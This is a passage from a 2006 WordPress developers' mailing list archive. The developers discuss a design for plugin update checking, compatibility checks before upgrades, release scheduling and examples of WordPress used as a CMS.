enough on this topic.  Are we just churning here?

Just my .02.

Scott

On 2/8/06, John Ha <khanh@netspace.net.au> wrote:
>
> Hope this is better - it was auto-marked by ciphire.
>   ----- Original Message -----
>   From: Stefano
>   To: wp-hackers@lists.automattic.com
>   Sent: Thursday, 9 February 2006 2:05 AM
>   Subject: Re: [wp-hackers] Simplicity in 2.next
>
>
>   Il Thu, 9 Feb 2006 01:58:49 +1100, "John Ha [c]"
>   <khanh@netspace.net.au> scrive:
>
>   >+1
>   >  ----- Original Message -----
>   >  From: Doug Stewart
>
>   Please if you agree, could you avoid to quote a bunch of text just to
>   write +1 thank you
>
>   --
>
>   Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
>   Email: steve@40annibuttati.it steagl@people.it
>   Sites: http://www.40annibuttati.it (personal blog)
>          http://www.wordpress-it.it (WordPress Italia)
>   _______________________________________________
>   wp-hackers mailing list
>   wp-hackers@lists.automattic.com
>   http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> --
> ------------------------ [ SECURITY NOTICE ]
> ------------------------
> To: wp-hackers@lists.automattic.com.
> For your security, khanh@netspace.net.au
> digitally signed this message on 08 February 2006 at 15:19:45 UTC.
> Verify this digital signature at http://www.ciphire.com/verify.
> ------------------- [ CIPHIRE DIGITAL SIGNATURE ]
> -------------------
> Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
> G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5AMUCAAB8AHwAAAABAAAAEQzqQ8UCAACOAg
> ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
> +YRTkO3r9j+q978iHOOe1FIMyNojdETJ9ec1+r7GNgNe3eQTY0QE/lCdEQ27Uqk3YGvyP
> 7v+1U2lnRW5k
> --------------------- [ END DIGITAL SIGNATURE ]
> ---------------------
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From jeff at jrm.cc  Wed Feb  8 17:57:32 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Wed Feb  8 17:59:11 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43E97631.2040907@mullenweg.com>
References: <43E97631.2040907@mullenweg.com>
Message-ID: <43EA310C.4070508@jrm.cc>

Matt Mullenweg wrote:
> What are your favorite examples of WordPress being used for something 
> other than a blog, primarily? Feel free to toot your own horn.

http://tlfutures.org/
- Used, not only for CMS, but as a calendar hack up as well.

http://eastwestbest.net/
- WP for product management, pages for a few stats elements.

Fun projects both :D

Jeff Minard
From dstewart at atl.lmco.com  Wed Feb  8 18:51:18 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb  8 18:52:51 2006
Subject: [wp-hackers] Simplicity in 2.next - plugin update checking
In-Reply-To: <43E91587.8020804@ftwr.co.uk>
References: <43E91587.8020804@ftwr.co.uk>
Message-ID: <43EA3DA6.1020008@atl.lmco.com>

Peter Westwood wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> I am not convinced that we can easily integrate firefox like automatic
> plugin updating into the core.
> 
> If we this this is achievable then we should focus on implementing auto
> updating of WordPress itself!
> 
> I am also not a big fan of adding supported version number headers to
> plugins because it can be very annoying when a firefox plugin refuses to
> run because of these checks. I suspect that some if not most plugin
> authors would stick in a max version so high that the checks would be
> negated.
> 
> However, i do think there are some great improvements we could make:
> 
> 1/ Add an update url header to plugins.
> 
> e.g.: Update URI: rest://example.org/hello-world/
> and/or Update URI: xmlrpc://example.org/hello-world/
> 
> These would be provided by the calling WordPress install with the plugin
> version and WordPress version to allow for taylored update messages and
> 
> The rest endpoint would be called with the two version numbers as part
> of the url e.g.
> rest:/example.org/hello-world/%plugin-version%/%wordpress-version%/
> 
> The xmlrpc endpoint would be well defined with example server code
> available on the codex.
> 
> 2/ Add a new tab to the plugins section which allows the user to check
> for updates - this would check for updates for all plugins with update
> urls and display a list of update messages (HTML returned from the
> update service and cached in the db) or a message to the effect of this
> plugin has no update uri please check the authors site for updates
> (linking to the Plugin URI from the plugin header)
> 
> This update page would only check for updates when the user requests it
> _not_ on every visits.
> 
> We could and should limit the update checks to once per day to ensure
> that we don't DOS the authors site.
> 
> We could provide via wp-plugins.org a hosted update endpoint service
> that plugin authors can use to take the strain if they don't want to
> host the plugin themselves.
> 
> We could make the update service handlers pluggable to allow plugin
> authors to define there own update service handler (instead of the
> builtin rest and xmlrpc handlers)
> 
> What do people think?
> 
> 

I really feel as if that's just about the ideal solution at this point.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From ryan at boren.nu  Wed Feb  8 19:42:33 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 19:44:10 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
In-Reply-To: <8e1656660602080836v4a299424x39b140734ab61575@mail.gmail.com>
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com> <07c401c62cc0$2b8865a0$6401a8c0@k9>
	<t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>
	<07fc01c62cc3$17758360$6401a8c0@k9>
	<8e1656660602080836v4a299424x39b140734ab61575@mail.gmail.com>
Message-ID: <1139427753.1474.4.camel@localhost.localdomain>

On Wed, 2006-02-08 at 11:36 -0500, Scott johnson wrote:
> *Chuckle*.  Um given that even Matt himself said plugin hosting on
> wp-plugins.org was optional I wonder if this particular thread is long
> enough on this topic.  Are we just churning here?

We're having the same argument we always have.

To summarize.  Provide a Firefox style plugin manager. This would allow
plugins to be distributed from anywhere.

Locating plugins in wp-plugins will allow us to better maintain them.
Automation that looks for problems can be run, authors can be notified
of problems, and plugins can be fixed if authors cannot be tracked down.

That is all.  So, someone write a firefox style extension manager so we
can get something useful out of this thread.

Ryan

From mattias at winthernet.se  Wed Feb  8 19:42:39 2006
From: mattias at winthernet.se (Mattias Winther)
Date: Wed Feb  8 19:44:20 2006
Subject: [wp-hackers] Simplicity in 2.next - summary?
In-Reply-To: di4ku19r96rpkk9co23kvl23ocpjuphlt1@4ax.com
Message-ID: <4a9b817acaf4911917b0750c67745594@imap.scorpionshops.com>


Okay, sorry if I'm just rehashing all of this once more, but from what I understand, the useful points coming out of this is basically:

* Some developers don't want to use wp-plugins.org
* Plug-in gardening is a feasible idea, work-wise, but changing other people's code isn't popular
* It would be nice to be able to automatically update plug-ins, or at least suggest it to the user
* It would be great for the user to know if a plug-in doesn't work with the new version
* The devs need some heads up in order to fix their plug-ins to work with new versions

I'm sure I've forgotten some, but from this, I've distilled a few ideas:

* Let the gardeners be testers, rather than code fixers. When a new version is coming closer to release, test and let the developer know if their plug-in isn't working. If a plug-in is known not to work, add to...
* Some kind of warning-list, where plug-ins that haven't been fixed can be added, and after updating WP, the plug-in interface shows a warning message for those plug-ins. Apple had a compatibility tool they used when they did some major update of the OS way back when, I believe. No code analysis, just matching the filename. Same principle.
* Implement a standard version numbering method for plug-ins to facilitate this and the automatic update finder function more easily

From mattias at winthernet.se  Wed Feb  8 19:44:15 2006
From: mattias at winthernet.se (Mattias Winther)
Date: Wed Feb  8 19:45:53 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
In-Reply-To: 1139427753.1474.4.camel@localhost.localdomain
Message-ID: <d7d52f8ce164b706843170a71a4699a6@imap.scorpionshops.com>


Syncronicity. :)

On Wed, 08 Feb 2006 11:42:33 -0800, Ryan Boren <ryan@boren.nu> wrote:
> On Wed, 2006-02-08 at 11:36 -0500, Scott johnson wrote:
>> *Chuckle*.  Um given that even Matt himself said plugin hosting on
>> wp-plugins.org was optional I wonder if this particular thread is long
>> enough on this topic.  Are we just churning here?
> 
> We're having the same argument we always have.
> 
> To summarize.  Provide a Firefox style plugin manager. This would allow
> plugins to be distributed from anywhere.
> 
> Locating plugins in wp-plugins will allow us to better maintain them.
> Automation that looks for problems can be run, authors can be notified
> of problems, and plugins can be fixed if authors cannot be tracked down.
> 
> That is all.  So, someone write a firefox style extension manager so we
> can get something useful out of this thread.
> 
> Ryan
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ryan at boren.nu  Wed Feb  8 19:51:34 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 19:53:06 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <ebe43d680602080610g58468270u@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
Message-ID: <1139428294.1474.11.camel@localhost.localdomain>

On Wed, 2006-02-08 at 14:10 +0000, David House wrote:
> On 08/02/06, Ryan Duff <ryan@ryanduff.net> wrote:
> > Advance notifications would be nice. Oh wait, I guess your logic is most
> > plugin authors don't follow the hackers list, therefore, why make an
> > announcement or have a public beta so they can fix things.
> 
> We could have a mailing list for plugin authors to subscribe to that
> only posted preview release announcements. Or, we could put it on the
> devblog with a big disclaimer: 'do not actually install, for plugin
> authors only'.

We do need to do better with release planning, but the beta and RC cycle
for 2.0 was months long and several announcements were made.  The RC
was announced on the dev blog.  Several announcements were made to the
testers list.  The weekly IRC meetup discussed the releases.

For 2.1, we need to try to nail down a release schedule.  The schedule
can always be changed if needed, but having even a moving target is
nice.

Ryan

From ryan at boren.nu  Wed Feb  8 19:57:21 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 19:58:54 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <ebe43d680602080608g4fb58d74k@mail.gmail.com>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
	<1139396935.5565.20.camel@localhost.localdomain>
	<ebe43d680602080608g4fb58d74k@mail.gmail.com>
Message-ID: <1139428641.1474.15.camel@localhost.localdomain>

On Wed, 2006-02-08 at 14:08 +0000, David House wrote:
> On 08/02/06, Ryan Boren <ryan@boren.nu> wrote:
> > I think it was scrubbed.  Try this.
> 
> Mailman seems to scrub attachments with 'malicious' extensions, and I
> guess .diff is among them (actually, more likely, it whitelists).
> 
> If you rename it to a .txt it works.

Let's try this then.

BTW, the link I sent earlier was the wrong diff.  This one should be the
right one.

Ryan
From fuzzygroup at gmail.com  Wed Feb  8 20:00:02 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Wed Feb  8 20:01:40 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <1139428294.1474.11.camel@localhost.localdomain>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
Message-ID: <8e1656660602081200i3c2a799ayae964a3b0927a874@mail.gmail.com>

Fwiw I've always found release schedules incredibly valuable planning
tools.  Just picking a date -- generally an early one -- causes things to
catalyze and start to gel.  Imho dates are both magically powerful and
magically delicious.

Scott

On 2/8/06, Ryan Boren <ryan@boren.nu> wrote:
>
> On Wed, 2006-02-08 at 14:10 +0000, David House wrote:
> > On 08/02/06, Ryan Duff <ryan@ryanduff.net> wrote:
> > > Advance notifications would be nice. Oh wait, I guess your logic is
> most
> > > plugin authors don't follow the hackers list, therefore, why make an
> > > announcement or have a public beta so they can fix things.
> >
> > We could have a mailing list for plugin authors to subscribe to that
> > only posted preview release announcements. Or, we could put it on the
> > devblog with a big disclaimer: 'do not actually install, for plugin
> > authors only'.
>
> We do need to do better with release planning, but the beta and RC cycle
> for 2.0 was months long and several announcements were made.  The RC
> was announced on the dev blog.  Several announcements were made to the
> testers list.  The weekly IRC meetup discussed the releases.
>
> For 2.1, we need to try to nail down a release schedule.  The schedule
> can always be changed if needed, but having even a moving target is
> nice.
>
> Ryan
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From ringmaster at midnightcircus.com  Wed Feb  8 20:22:48 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  8 20:23:30 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <1139428641.1474.15.camel@localhost.localdomain>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>
	<1139428641.1474.15.camel@localhost.localdomain>
Message-ID: <43EA5318.6030500@midnightcircus.com>

Ryan Boren wrote:
> Let's try this then.

No workie.

Owen

From ryan at boren.nu  Wed Feb  8 20:28:37 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 20:30:10 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EA5318.6030500@midnightcircus.com>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
	<1139396935.5565.20.camel@localhost.localdomain>
	<ebe43d680602080608g4fb58d74k@mail.gmail.com>
	<1139428641.1474.15.camel@localhost.localdomain>
	<43EA5318.6030500@midnightcircus.com>
Message-ID: <1139430518.1474.29.camel@localhost.localdomain>

On Wed, 2006-02-08 at 15:22 -0500, Owen Winkler wrote:
> Ryan Boren wrote:
> > Let's try this then.
> 
> No workie.

Is this thing on?

http://boren.nu/downloads/status_type.diff.txt


Ryan

From jarret at netspace.net.au  Wed Feb  8 20:57:56 2006
From: jarret at netspace.net.au (JARRET NETSPC)
Date: Wed Feb  8 20:59:41 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>
References: <43E97631.2040907@mullenweg.com>	<20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>	<43E9A26C.8090501@mullenweg.com>
	<E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>
Message-ID: <43EA5B54.3080006@netspace.net.au>

Why would you not want WP updating the mod_rewrite rules?

cheerio

Jarret

Alex King wrote:
> Thanks guys. I wanted to point out that the FeedLounge web site runs 
> nearly exclusively on WP (with PunBB for the forums and a custom 
> script for feature voting), and isn't nearly as "hacked" as my King 
> Design site is. I think the only thing I've really customized (besides 
> the theme and a couple of plugins) is not allowing WP to update the 
> mod_rewrite rules and handling those by hand.
>
> It would be hard to convince me *not* to build a site on WP these 
> days. :)
>
> Cheers,
> --Alex King
>
> Personal             Business               FeedLounge
> http://alexking.org  http://kingdesign.net  http://feedlounge.com
>
>
>
>
> On Feb 8, 2006, at 12:49 AM, Matt Mullenweg wrote:
>
>> Roy Schestowitz wrote:
>>> Apart from heavily-hacked WordPress like < 
>>> http://www.kingdesign.net/ >,
>>
>> Alex's site is great, thanks for pointing that out.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From himself at arnebrachhold.de  Wed Feb  8 21:06:21 2006
From: himself at arnebrachhold.de (Arne Brachhold)
Date: Wed Feb  8 21:08:25 2006
Subject: [wp-hackers] Simplicity in 2.next - plugin update checking
References: <43E91587.8020804@ftwr.co.uk>
Message-ID: <007201c62cf3$907e28e0$020e0c0a@soulnet.local>

Hi,

the problem with non-working plugins after WordPress updates could
be avoided if we check them for problems BEFORE upgrading it. 

If a user sees, that some plugins won't work with the new version 
(and there are no updates for them available), he might consider
to wait until they are compatible.

The installation screen could check for plugin updates like 
Peter Westwood mentioned in the mail above. 
The webservice (or whatever) could give a response like:

- Up to date and working with the new version
- Not working (and no update available)
- Not tested (use at your own risk)
- Needs update to work (and is available)
 
"Not working" should disable the plugin automatically so there 
are should be no errors after installation. "Needs update"
should download the new version and install it after the
Wordpress update has finished.


Arne




From VOGELAP at UCMAIL.UC.EDU  Wed Feb  8 21:18:06 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Wed Feb  8 21:19:20 2006
Subject: [wp-hackers] Simplicity in 2.next - plugin update checking
Message-ID: <E7340445E0595A418B2F8DE0AE480E200995B3F4@ucmail6.ad.uc.edu>

EXCELLENT idea. Good thinking.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Arne Brachhold
> Sent: Wednesday, February 08, 2006 4:06 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Simplicity in 2.next - plugin 
> update checking
> 
> Hi,
> 
> the problem with non-working plugins after WordPress updates 
> could be avoided if we check them for problems BEFORE upgrading it. 
> 
> If a user sees, that some plugins won't work with the new 
> version (and there are no updates for them available), he 
> might consider to wait until they are compatible.
> 
> The installation screen could check for plugin updates like 
> Peter Westwood mentioned in the mail above. 
> The webservice (or whatever) could give a response like:
> 
> - Up to date and working with the new version
> - Not working (and no update available)
> - Not tested (use at your own risk)
> - Needs update to work (and is available)
>  
> "Not working" should disable the plugin automatically so 
> there are should be no errors after installation. "Needs update"
> should download the new version and install it after the 
> Wordpress update has finished.
> 
> 
> Arne
> 
> 
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From nuclearmoose at gmail.com  Wed Feb  8 21:37:39 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb  8 21:39:12 2006
Subject: [wp-hackers] imgsize in upload.php
In-Reply-To: <09d101c62ccd$f56088a0$6801a8c0@AUSTIN>
References: <09d101c62ccd$f56088a0$6801a8c0@AUSTIN>
Message-ID: <5aa3aa0602081337j390a86a2l9d1396c76a8509f9@mail.gmail.com>

My comment to this is wondering about the border="0" declaration. Would that
override any CSS styling created by the active site theme? I would offer the
opinion that styling should be in the CSS file(s) and not the code itself.

Craig.
Nuclear Moose.
From peter.westwood at ftwr.co.uk  Wed Feb  8 22:07:36 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed Feb  8 22:09:12 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
In-Reply-To: <1139427753.1474.4.camel@localhost.localdomain>
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net>	<43E95820.7050803@boren.nu>
	<43E9A0EA.6080606@mullenweg.com>	<1139384828.5565.19.camel@localhost.localdomain>	<43EA056E.4040002@atl.lmco.com>
	<07c401c62cc0$2b8865a0$6401a8c0@k9>	<t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>	<07fc01c62cc3$17758360$6401a8c0@k9>	<8e1656660602080836v4a299424x39b140734ab61575@mail.gmail.com>
	<1139427753.1474.4.camel@localhost.localdomain>
Message-ID: <43EA6BA8.4060809@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Ryan Boren wrote:
> On Wed, 2006-02-08 at 11:36 -0500, Scott johnson wrote:
>> *Chuckle*.  Um given that even Matt himself said plugin hosting on
>> wp-plugins.org was optional I wonder if this particular thread is long
>> enough on this topic.  Are we just churning here?
> 
> We're having the same argument we always have.
> 
> To summarize.  Provide a Firefox style plugin manager. This would allow
> plugins to be distributed from anywhere.
> 
> Locating plugins in wp-plugins will allow us to better maintain them.
> Automation that looks for problems can be run, authors can be notified
> of problems, and plugins can be fixed if authors cannot be tracked down.
> 
> That is all.  So, someone write a firefox style extension manager so we
> can get something useful out of this thread.
> 

Does this firefox style extension manager require to be able to install
the updates?

Or is the one I suggested in this [1] thread good enough?

If it is good enough - I'll get to work on it.

[1] -
http://comox.textdrive.com/pipermail/wp-hackers/2006-February/004637.html

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6muoVPRdzag0AcURAqr8AKCdFsCvcGz+/GMRGxdX0Wq5FVx/yACfVR/b
8cE/LKXQwUS8KWN2dS//OAU=
=dQBn
-----END PGP SIGNATURE-----

From peter.westwood at ftwr.co.uk  Wed Feb  8 22:19:29 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed Feb  8 22:21:17 2006
Subject: [wp-hackers] Simplicity in 2.next - plugin update checking
In-Reply-To: <007201c62cf3$907e28e0$020e0c0a@soulnet.local>
References: <43E91587.8020804@ftwr.co.uk>
	<007201c62cf3$907e28e0$020e0c0a@soulnet.local>
Message-ID: <43EA6E71.1080305@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Arne Brachhold wrote:
> Hi,
> 
> the problem with non-working plugins after WordPress updates could
> be avoided if we check them for problems BEFORE upgrading it.
> If a user sees, that some plugins won't work with the new version (and
> there are no updates for them available), he might consider
> to wait until they are compatible.
> 
> The installation screen could check for plugin updates like Peter
> Westwood mentioned in the mail above. The webservice (or whatever) could
> give a response like:
> 
> - Up to date and working with the new version
> - Not working (and no update available)
> - Not tested (use at your own risk)
> - Needs update to work (and is available)
> 
> "Not working" should disable the plugin automatically so there are
> should be no errors after installation. "Needs update"
> should download the new version and install it after the
> Wordpress update has finished.
> 

This kind of more advanced functionality required more heavy lifting in
terms of the webservice providing the update info than a simple update
message - it also makes it easier to implement in the xmlrpc case than
the rest case.  Which may increase the processing load on the plugin
providers if they wish to use the functionality.

The rest case switches from returning some HTML to display to providing
a parseable resource, for example an xml document, which provides the
information.

I think that the best first step is to get update notification into the
core.  If we then move onto update download and install ability that is
a good improvement that can build upon the previous work.

We just need to ensure the design has the extension in mind ;-)

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6m5xVPRdzag0AcURAkrSAJ4jIaeVPAVOl8usXI+KffBF3TGabACfR0KC
5SgPm1dESZtj+XsuTQjN3zY=
=u8F1
-----END PGP SIGNATURE-----

From lists at alexking.org  Wed Feb  8 22:53:49 2006
From: lists at alexking.org (Alex King)
Date: Wed Feb  8 22:55:23 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43EA5B54.3080006@netspace.net.au>
References: <43E97631.2040907@mullenweg.com>	<20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>	<43E9A26C.8090501@mullenweg.com>
	<E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>
	<43EA5B54.3080006@netspace.net.au>
Message-ID: <1B1D6EF9-C23B-4B42-8329-8719E522E407@alexking.org>

On Feb 8, 2006, at 1:57 PM, JARRET NETSPC wrote:
> Why would you not want WP updating the mod_rewrite rules?

Because the automatically written rules were breaking - they weren't  
really intended to handle my link structure:

/pagename - page
/pagename/pagename - page
/blog/ - blog
/blog/YYYY/MM/DD/postname - blog post
/blog/categoryname - blog category

A /pagename and a /blog/categoryname of the same name (for example: / 
features and /blog/features) would cause conflicts (and there were  
some other related issues I don't recall anymore).

Manually handling the rewrite rules solves this nicely.

Cheers,
--Alex

Personal             Business               FeedLounge
http://alexking.org  http://kingdesign.net  http://feedlounge.com


From ryan at boren.nu  Wed Feb  8 23:03:54 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 23:05:29 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
In-Reply-To: <43EA6BA8.4060809@ftwr.co.uk>
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com> <07c401c62cc0$2b8865a0$6401a8c0@k9>
	<t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>
	<07fc01c62cc3$17758360$6401a8c0@k9>
	<8e1656660602080836v4a299424x39b140734ab61575@mail.gmail.com>
	<1139427753.1474.4.camel@localhost.localdomain>
	<43EA6BA8.4060809@ftwr.co.uk>
Message-ID: <1139439835.1474.38.camel@localhost.localdomain>

On Wed, 2006-02-08 at 22:07 +0000, Peter Westwood wrote:
> Does this firefox style extension manager require to be able to install
> the updates?

Ideally, yes.  File management is a pain though, so we'd have to degrade
nicely in those environments where we can't do the install
automatically.

> Or is the one I suggested in this [1] thread good enough?
> 
> If it is good enough - I'll get to work on it.

Just checking for updates is a good start.  We also need to check
plugins for updates during upgrades and deactivate any plugins that
require updates prior to running the WP upgrade.  Owen and Andy
discussed this elsewhere in the thread.

Take a look at the firefox rdf files (install.rdf, contents.rd, etc.)
and what they have in them.  We need to decide if we need separate rdf
files, or if we can just add some fields to the plugin header.  Using
the plugin header is nice because it allows us to continue offering
one-file plugins.

We should probably bump this into its own thread.  If you want to get a
proposal going, start a "Plugin Manager" thread.  Researching what
firefox does and finding out what the relevant bits of the extension
rdfs are would be helpful.

Ryan

From ringmaster at midnightcircus.com  Thu Feb  9 00:46:21 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Feb  9 00:48:11 2006
Subject: [wp-hackers] Simplicity in 2.next - plugin update checking
In-Reply-To: <43EA6E71.1080305@ftwr.co.uk>
References: <43E91587.8020804@ftwr.co.uk>
	<007201c62cf3$907e28e0$020e0c0a@soulnet.local>
	<43EA6E71.1080305@ftwr.co.uk>
Message-ID: <43EA90DD.9040602@midnightcircus.com>

Peter Westwood wrote:
> This kind of more advanced functionality required more heavy lifting in
> terms of the webservice providing the update info than a simple update
> message - it also makes it easier to implement in the xmlrpc case than
> the rest case.  Which may increase the processing load on the plugin
> providers if they wish to use the functionality.

Yeah, I don't think plugin-server-side checking is necessary.  If the 
right information is sent back for the request, it could be made via 
rest, and handled by serving a static file in response.  The core 
functionality should parse the response and determine the best course of 
action.

Still, the response could contain enough information to come up with an 
answer to the question that is as detailed as "Current & 
Compatible"/"Not compatible & No Update"/"Not tested"/"Needs Update" or 
any number of other results.

> I think that the best first step is to get update notification into the
> core.  If we then move onto update download and install ability that is
> a good improvement that can build upon the previous work.

Matt Read has a good plugin in beta to cannibalize:
http://mattread.com/archives/2006/02/introducing-installer-the-plugin-2/

It installs and uninstalls plugins and themes from zip archives. 
Basically one-click.  Pretty darn cool.

Owen

From dion at almaer.com  Thu Feb  9 03:15:38 2006
From: dion at almaer.com (Dion Almaer)
Date: Thu Feb  9 03:17:18 2006
Subject: [wp-hackers] imgsize in upload.php
In-Reply-To: <5aa3aa0602081337j390a86a2l9d1396c76a8509f9@mail.gmail.com>
Message-ID: <0bbc01c62d27$1b0ba400$6801a8c0@AUSTIN>

Craig,

You are right about the border="0" for the generic case.

It was pragmatic in my situation.

I care more about the width/height being put in programatically.

Cheers,

Dion
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of Craig
> Sent: Wednesday, February 08, 2006 3:38 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] imgsize in upload.php
> 
> My comment to this is wondering about the border="0" 
> declaration. Would that override any CSS styling created by 
> the active site theme? I would offer the opinion that styling 
> should be in the CSS file(s) and not the code itself.
> 
> Craig.
> Nuclear Moose.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From m at mullenweg.com  Thu Feb  9 07:35:43 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Thu Feb  9 07:37:59 2006
Subject: [wp-hackers] New Trac list
Message-ID: <43EAF0CF.4010800@mullenweg.com>

Have you ever said to yourself, "I don't get enough email."

Is your Thunderbird a little lonely?

Does Gmail mock you with how much free space it has?

Join the new wp-trac list! Get a message whenever anyone in the world 
modifies a trac.wordpress.org ticket!

http://lists.automattic.com/mailman/listinfo/wp-trac

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From dmhouse at gmail.com  Thu Feb  9 07:52:54 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb  9 07:54:27 2006
Subject: [wp-hackers] New Trac list
In-Reply-To: <43EAF0CF.4010800@mullenweg.com>
References: <43EAF0CF.4010800@mullenweg.com>
Message-ID: <ebe43d680602082352t7cbf608ai@mail.gmail.com>

On 09/02/06, Matt Mullenweg <m@mullenweg.com> wrote:
> Join the new wp-trac list! Get a message whenever anyone in the world
> modifies a trac.wordpress.org ticket!

Super-useful. Thanks Matt :)

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From nuclearmoose at gmail.com  Thu Feb  9 07:54:26 2006
From: nuclearmoose at gmail.com (Craig)
